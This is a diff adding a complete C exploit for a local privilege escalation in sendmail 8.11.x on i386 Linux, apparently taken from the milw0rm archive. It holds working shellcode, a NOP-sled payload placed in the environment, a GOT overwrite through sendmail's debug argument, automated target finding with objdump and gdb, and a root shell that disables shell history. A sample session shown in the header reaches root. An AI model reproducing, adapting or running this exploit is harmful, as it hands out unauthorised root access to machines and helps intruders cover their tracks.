@@ -1,0 +1,404 @@
+/*
+	sendmail 8.11.x exploit (i386-Linux) by sd@sf.cz (sd@ircnet)
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	This code exploits well-known local-root bug in sendmail 8.11.x,
+	8.12.x may be vulnerable too, but I didn't test it.
+
+	It gives instant root shell with +s sendmail 8.11.x, x < 6
+
+	We're using objdump, gdb & grep in order to obtain VECT, so make sure
+	that they're on $PATH, works with 80% accuracy on stripped binaries
+	on several distros without changing offsets (rh7.0, rh7.1, suse7.2,
+	slackware 8.0...)
+
+	Greetz:
+
+	mlg & smoke : diz is mostly for .ro ppl ;) killall sl3
+	sorcerer    : stop da fuckin' asking me how to sploit sm, diz crap
+	              is for lamers like you ;))))
+	devik       : sm 0wns ;)
+	to #linux.cz, #hack ....
+
+	.... and to alot of other ppl, where i can't remeber theyr handles ;)
+
+	args:
+	-d     specify depth of analysis (default=32) [bigger = more time]
+	-o     change offset (default = -32000) [between 1000..-64000]
+	-v     specify victim (default /usr/sbin/sendmail) [+s sm binary]
+	-t     specify temp directory (default /tmp/.sxp)
+	       [temporary files, should be mounted as nosuid]
+
+	An example (redhat 7.0 CZ):
+-------------------------------------------------------------------------------
+[sd@pikatchu sxp]$ gcc sx.c -o sx
+[sd@localhost sxp]$ ./sx
+
+...-=[ Sendmail 8.11.x exploit, (c)oded by sd@sf.cz [sd@ircnet], 2001 ]=-...
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+[*] Victim = /usr/sbin/sendmail
+[*] Depth  = 32
+[*] Offset = -16384
+[*] Temp   = /tmp/.sxp
+[*] ESP    = 0xbfffe708
+[+] Created /tmp/.sxp
+[+] Step 1. setuid() got = 0x080aa028
+[*] Step 2. Copying /usr/sbin/sendmail to /tmp/.sxp/sm...OK
+[*] Step 3. Disassembling /tmp/.sxp/sm...OK, found 3 targets
+[*] Step 4. Exploiting 3 targets:
+[1] (33% of targets) GOT=0x080aa028, VECT=0x00000064, offset=-16384
+[2] (66% of targets) GOT=0x080aa028, VECT=0x080c6260, offset=-16384
+
+Voila babe, entering rootshell!
+Enjoy!
+uid=0(root) gid=0(root) groups=0(root)
+[root@pikatchu /]# whoami
+root
+[root@pikatchu /]# exit
+exit
+Thanx for choosing sd's products ;)
+[sd@pikatchu sxp]$
+--------------------------------------------------------------------------------
+
+	Enjoy! And don't abuse it too much :)
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <sys/wait.h>
+#include <string.h>
+
+#define	SM	"/usr/sbin/sendmail"
+#define	OBJDUMP	"objdump"
+#define	GDB	"gdb"
+#define GREP	"grep"
+
+#define	OURDIR	"/tmp/.sxp"
+
+/* an basic regexp to get interesting stuff from disassembled output
+   change it as you like if something doesn't work */
+
+#define	DLINE	"%s -d %s 2> /dev/null | %s -B %d \"mov.*%%.l,(%%e..,%%e..,1)\" | %s \".mov .*0x80.*,%%e..\""
+#define DLINEA	OBJDUMP, vict, GREP, depth, GREP
+
+#define	BRUTE_DLINE	"%s -d %s 2> /dev/null | %s \".mov .*0x80.*,%%e..\""
+#define BRUTE_DLINEA	OBJDUMP, vict, GREP
+
+
+#define NOPLEN	32768
+
+#define uchar unsigned char
+#define NOP 0x90
+
+/* 19 bytes ;), shell must be appended */
+char shellcode[] =
+	"\xeb\x0c\x5b\x31\xc0\x50\x89\xe1"
+        "\x89\xe2\xb0\x0b\xcd\x80\xe8\xef"
+        "\xff\xff\xff";
+
+
+char	scode[512];
+char	dvict[] = SM;
+
+struct	target {
+	uint	off;
+	uint	brk;
+	uint	vect;
+};
+
+unsigned int get_esp()
+{
+	__asm__("movl %esp,%eax");
+}
+
+char	ourdir[256] = OURDIR;
+
+/* cleanup */
+void	giveup(int i)
+{
+	char buf[256];
+	sprintf(buf, "/bin/rm -rf %s > /dev/null 2> /dev/null", ourdir);
+	system(buf);
+	if (i >= 0) exit(i);
+}
+
+/* main sploit, stolen mostly from alsou.c ;) */
+void	sploit(char *victim, uint got, uint vect, uint ret)
+{
+	uchar	egg[sizeof(scode) + NOPLEN + 5];
+	char	s[512] = "-d";
+	char	*argv[3];
+	char	*envp[2];
+	uint	first, last, i;
+
+	strcpy(egg, "EGG=");
+	memset(egg + 4, NOP, NOPLEN);
+	strcpy(egg + 4 + NOPLEN, scode);
+
+	last = first = -vect - (0xffffffff - got + 1);
+	while (ret) {
+		char	tmp[256];
+		i = ret & 0xff;
+		sprintf(tmp, "%u-%u.%u-", first, last, i);
+		strcat(s, tmp);
+		last = ++first;
+		ret = ret >> 8;
+	}
+	s[strlen(s) - 1] = 0;
+	argv[0] = victim;
+	argv[1] = s;
+	argv[2] = NULL;
+	envp[0] = egg;
+	envp[1] = NULL;
+	execve(victim, argv, envp);
+}
+
+int	use(char *s)
+{
+	 printf("%s [command] [options]\n"
+		"-h     this help\n"
+		"-d     specify depth of analysis (default=32)\n"
+		"-o     change offset (default = -32000)\n"
+		"-v     specify victim (default /usr/sbin/sendmail)\n"
+		"-t     specify temp directory (default /tmp/.sxp)\n"
+		"-b	enables bruteforce (WARNING: this may take about 20-30 minutes!)\n", s);
+	return 1;
+}
+
+/* exploited flag */
+int	exploited = 0;
+
+/* child root-shell will send us SIGUSR if everything is ok */
+void	sigusr(int i)
+{
+	exploited++;
+	giveup(-1);
+}
+
+int	main(int argc, char *argv[])
+{
+	char	victim[256] = SM;
+	char	vict[256];
+	char	gscr[256];
+	char	path[256];
+	
+	char	d[256];
+	struct	stat	st;
+	FILE	*f;
+	char	buf[256];
+	int	got;
+
+	struct	target t[1024];
+	uint	off, ep, l;
+	int	i,j;
+
+	int	offset = -16384;
+	int	esp;
+	int	depth = 32;
+	int	brute = 0;
+
+	/* rootshell (if argv[0] == NULL) */
+	if (!*argv) {
+		/* open stdin and stdout */
+		dup2(2, 0);
+		dup2(2, 1);
+		setuid(0);	/* regain root privs */
+		setgid(0);
+		/* send signal to parent that exploit is done */
+		kill(getppid(), SIGUSR1);
+		/* l-a-m-e ;) */
+		printf("\nVoila babe, entering rootshell!\nEnjoy!\n"); fflush(stdout);
+		chdir("/");
+		system("/usr/bin/id");
+		setenv("BASH_HISTORY", "/dev/null", 1);
+		execl("/bin/bash", "-bash", NULL);
+	}
+
+	printf("\n...-=[ Sendmail 8.11.x exploit, (c)oded by sd@sf.cz [sd@ircnet], 2001 ]=-...\n"
+	       "      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n");
+
+	while ( ( i = getopt(argc, argv, "hd:o:v:t:b") ) != EOF) {
+		switch (i) {
+			case 'd':
+				if ((!optarg) || (sscanf(optarg, "%d", &depth) != 1))
+					return use(argv[0]);
+				break;
+			case 'o':
+				if ((!optarg) || (sscanf(optarg, "%d", &offset) != 1))
+					return use(argv[0]);
+				break;
+			case 'v':
+				if (!optarg) return use(argv[0]);
+				strcpy(victim, optarg);
+				break;
+			case 't':
+				if (!optarg) return use(argv[0]);
+				strcpy(ourdir, optarg);
+				break;
+			case 'b':
+				brute++;
+				break;
+			case 'h':
+			default:
+				return use(argv[0]);
+		}
+	}
+	if (brute) printf("[*] Using brute force, this may take some time\n");
+	/* create full path to rootshell, cause
+           sendmail will change it's cwd */
+	path[0] = 0;
+	if (argv[0][0] != '/') {
+		getcwd(path, 256);
+	}
+
+	/* construct shellcode */
+	sprintf(scode, "%s%s/%s", shellcode, path, argv[0]);
+
+	/* get stack frame */
+	esp = get_esp();
+	close(0);
+	signal(SIGUSR1, sigusr);
+
+	/* remove old stuff */
+	giveup(-1);
+
+	printf( "[*] Victim = %s\n"
+		"[*] Depth  = %d\n"
+		"[*] Offset = %d\n"
+		"[*] Temp   = %s\n"
+		"[*] ESP    = 0x%08x\n",
+		victim,
+		depth,
+		offset,
+		ourdir,
+		esp);
+	stat(victim, &st);
+	if ((st.st_mode & S_ISUID) == 0) {
+		printf("[-] Bad: %s isn't suid ;(\n", victim);
+	}
+
+	if (access(victim, R_OK + X_OK + F_OK) < 0) {
+		printf("[-] Bad: We haven't access to %s !\n", victim);
+	}
+
+	if (mkdir(ourdir, 0777) < 0) {
+		perror("[-] Can't create our tempdir!\n");
+		giveup(1);
+	}
+	printf("[+] Created %s\n", ourdir);
+	sprintf(buf, "%s -R %s | grep setuid", OBJDUMP, victim);
+	f = popen(buf, "r");
+	if (fscanf(f, "%x", &got) != 1) {
+		pclose(f);
+		printf("[-] Cannot get setuid() GOT\n");
+		giveup(1);
+	}
+	/* get GOT */
+	pclose(f);
+	printf("[+] Step 1. setuid() got = 0x%08x\n", got);
+	sprintf(vict, "%s/sm", ourdir);
+	printf("[*] Step 2. Copying %s to %s...", victim, vict); fflush(stdout);
+	sprintf(buf, "/bin/cp -f %s %s", victim, vict);
+	system(buf);
+	if (access(vict, R_OK + X_OK + F_OK) < 0) {
+		perror("Failed");
+		giveup(1);
+	}
+	printf("OK\n");
+	/* disassemble & find targets*/
+	printf("[*] Step 3. Disassembling %s...", vict); fflush(stdout);
+	if (!brute) {
+		sprintf(buf, DLINE, DLINEA);
+	} else {
+		sprintf(buf, BRUTE_DLINE, BRUTE_DLINEA);
+	}
+	f = popen(buf, "r");
+	i = 0;
+	while (fgets(buf, 256, f)) {
+		int	k, dontadd = 0;
+		if (sscanf(buf, "%x: %s %s %s %s %s %s 0x%x,%s\n",
+                    &ep, d, d, d, d, d, d, &off, d) == 9) {
+			/* same value ? */
+			for (k=0; k < i; k++) {
+				if (t[k].off == off) dontadd++;
+			}
+			/* new value ? */
+			if (!dontadd) {
+				/* add it to table */
+				t[i].off = off;
+				t[i++].brk = ep;
+			}
+		}
+	}
+	pclose(f);
+	printf("OK, found %d targets\n", i);
+
+	/* gdb every target and look for theyr VECT */
+	printf("[*] Step 4. Exploiting %d targets:\n", i); fflush(stdout);
+	sprintf(gscr, "%s/gdb", ourdir);
+
+	off = 0;
+	for (j=0; j < i; j++) {
+		/* create gdb script */
+		f = fopen(gscr, "w+");
+		if (!f) {
+			printf("Cannot create gdb script\n");
+			giveup(1);
+		}
+		fprintf(f, "break *0x%x\nr -d1-1.1\nx/x 0x%x\n", t[j].brk, t[j].off);
+		fclose(f);
+		sprintf(buf, "%s -batch -x %s %s 2> /dev/null", GDB, gscr, vict);
+		f = popen(buf, "r");
+		if (!f) {
+			printf("Failed to spawn gdb!\n");
+			giveup(1);
+		}
+		/* scan gdb's output */
+		while (1) {
+			char buf[256];
+			char *p;
+			t[j].vect = 0;
+			p = fgets(buf, 256, f);
+			if (!p) break;
+			if (sscanf(p, "0x%x %s 0x%x", &ep, d, &l) == 3) {
+				t[j].vect = l;
+				off++;
+				break;
+			}
+		}
+		pclose(f);
+		if (t[j].vect) {
+			int	pid;
+			printf("[%d] (%d%% of targets) GOT=0x%08x, VECT=0x%08x, offset=%d\n", j, j*100/i , got, t[j].vect, offset);
+			fflush(stdout);
+			pid = fork();
+			if (pid == 0) {
+				close(1);
+				sploit(victim, got, t[j].vect, esp + offset);
+			}
+			/* wait until sendmail finishes (expoit failed)
+	                   or until SIGUSR arrives */
+			wait(NULL);
+			/* exploited ?? */
+			if (exploited) {
+				wait(NULL);	/* kill zombie */
+				printf("Thanx for choosing sd's products ;)\n");
+				exit(0);
+			}
+		}
+	}
+	printf("[-] All targets failed, probably not vulnerable ;(\n");
+	giveup(1);
+}
+
+/* That's all. */
+
+
+
+// milw0rm.com [2001-01-01]
